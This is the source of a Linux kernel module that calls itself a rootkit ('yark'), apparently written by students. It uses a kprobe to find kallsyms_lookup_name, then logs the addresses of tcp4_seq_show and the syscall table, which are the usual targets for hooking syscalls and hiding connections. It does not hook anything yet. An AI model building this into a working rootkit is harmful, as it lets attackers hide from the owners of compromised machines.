#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Students from Institute of Information Engineering");
MODULE_DESCRIPTION("Yet another rootkit.");
MODULE_VERSION("0.01");

#define MODULE_NAME "yark"
#define LOG_PREFIX "yark: "

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

void *search_function_with_kprobe(const char *symbol_name) {
    void *addr;
    struct kprobe kp = {.symbol_name = symbol_name};
    if (register_kprobe(&kp) < 0) {
        return NULL;
    }
    addr = kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

static int __init yark_init(void) {
    kallsyms_lookup_name_t kallsyms_lookup_name;
    unsigned long **sys_call_table;

    pr_info(LOG_PREFIX "call yark_init()");

    kallsyms_lookup_name = (kallsyms_lookup_name_t)search_function_with_kprobe(
        "kallsyms_lookup_name");

    pr_info(LOG_PREFIX "address of kallsyms_lookup_name: %px",
            kallsyms_lookup_name);


    void * tcp4_seq_show = (void*)search_function_with_kprobe(
        "tcp4_seq_show");

    pr_info(LOG_PREFIX "address of tcp4_seq_show: %px",
            tcp4_seq_show);


    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");

    pr_info(LOG_PREFIX "address of sys_call_table: %px", sys_call_table);

    return 0;
}

static void __exit yark_exit(void) { pr_info(LOG_PREFIX "call yark_exit()"); }

module_init(yark_init);
module_exit(yark_exit);